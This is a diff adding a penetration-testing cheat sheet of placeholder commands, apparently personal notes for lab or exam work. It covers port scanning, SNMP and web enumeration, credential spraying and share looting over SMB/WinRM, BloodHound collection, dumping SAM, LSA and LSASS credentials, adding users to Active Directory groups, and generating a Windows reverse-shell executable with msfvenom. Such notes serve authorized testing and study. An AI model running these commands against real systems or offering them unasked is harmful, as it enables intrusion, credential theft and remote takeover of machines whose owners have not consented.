@@ -1,0 +1,70 @@
+Port Scanning
+sudo nmap -sS -p- --min-rate 5000 -T4 -n -Pn <IP> | tee /dev/tty | grep "[1]" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$/\n/'
+
+sudo nmap -sU --min-rate 5000 -T4 -n -Pn <IP>
+
+sudo nmap -sV -sC -p <PORTS> -T4 -A -Pn <IP>
+
+SNMP
+onesixtyone -c <wordlist> <IP>
+
+snmpbulkwalk -c <community> -v2c -Cr1000 <IP> . > snmp.txt
+
+cat snmp.txt | grep -E "\w+:\w+"
+
+FTP / SSH
+ftp <IP>
+
+ssh <user>@<IP> -i <key>
+
+Disk Group Privesc
+df -h
+
+debugfs /dev/mapper/<device>
+
+Web Enumeration
+feroxbuster -u http://<IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,php3,html,txt,asp,aspx -s 200,301,302 -t 100
+
+WinRM / SMB
+evil-winrm -i <IP> -u <user> -p <password>
+
+nxc smb <IP> -u <user> -p <password>
+nxc smb <IP> -u <userlist> -p <passlist> --local-auth
+nxc smb <IP> -u <user> -p <password> --shares
+nxc smb <IP> -u <user> -p <password> -M spider_plus -t 2
+nxc smb <IP> -u <user> -p <password> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/loot -t 2
+nxc winrm <IP> -u <user> -p <password>
+nxc ldap <IP> -u <user> -p <password> --users
+nxc ldap <IP> -u <user> -p <password> --bloodhound --collection All --dns-server <DC_IP>
+
+NetExec Multi-Protocol Check
+for ip in <IP>; do
+  for mod in smb winrm wmi rdp mssql ldap; do
+    nxc $mod $ip -u <user> -p <password>
+  done
+  for mod in ssh ftp nfs vnc; do
+    nxc $mod $ip -u <user> -p <password>
+  done
+done
+
+MSSQL
+impacket-mssqlclient <DOMAIN>/<user>:<pass>@<IP> -windows-auth
+
+RDP
+xfreerdp3 /v:<IP> /u:<user> /p:<password> /dynamic-resolution
+
+SAM / LSA / LSASS
+crackmapexec smb <IP> -u <user> -p <password> --sam
+crackmapexec smb <IP> -u <user> -p <password> --lsa
+nxc smb <IP> -u <user> -p <password> -M lsassy
+nxc smb <IP> -u <user> -p <password> -M nanodump
+
+Active Directory
+net rpc group addmem "<GROUP>" "<USER>" -U "<DOMAIN>"/"<USER>"%"<PASS>" -S <DC_IP>
+net rpc group members "<GROUP>" -U "<DOMAIN>"/"<USER>"%"<PASS>" -S <DC_IP>
+
+Payload Generation
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <output.exe>
+
+Unzip
+unzip <file>.zip
